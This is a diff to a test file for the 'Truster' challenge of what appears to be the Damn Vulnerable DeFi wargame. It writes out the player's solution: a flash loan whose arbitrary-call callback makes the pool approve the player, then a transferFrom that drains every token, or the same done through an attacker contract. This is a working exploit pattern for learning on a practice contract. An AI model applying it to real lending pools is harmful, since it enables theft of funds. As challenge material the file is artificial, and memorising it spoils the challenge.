@@ -23,20 +23,20 @@ describe('[Challenge] Truster', function () {
 
     it('Execution', async function () {
         /** CODE YOUR SOLUTION HERE */
-        const attacker = await (await ethers.getContractFactory('TakeAllTruster', player)).deploy(token.address);
-        await attacker.connect(player).takeAll(pool.address,player.address);
+        // do it with EOA
+        // let abi = new ethers.utils.Interface(['function approve(address,uint256)']);
+        // await pool.connect(player).flashLoan(0, player.address, token.address, abi.encodeFunctionData('approve', [player.address, TOKENS_IN_POOL]));
+        // await token.connect(player).transferFrom(pool.address, player.address, TOKENS_IN_POOL);
+
+        // do it in one transaction with a smart contract
+        await (await ethers.getContractFactory('TakeAllTruster', player)).deploy(token.address, pool.address, player.address);
     });
 
     after(async function () {
         /** SUCCESS CONDITIONS - NO NEED TO CHANGE ANYTHING HERE */
 
         // Player has taken all tokens from the pool
-        expect(
-            await token.balanceOf(player.address)
-        ).to.equal(TOKENS_IN_POOL);
-        expect(
-            await token.balanceOf(pool.address)
-        ).to.equal(0);
+        expect(await token.balanceOf(player.address)).to.equal(TOKENS_IN_POOL);
+        expect(await token.balanceOf(pool.address)).to.equal(0);
     });
 });
-
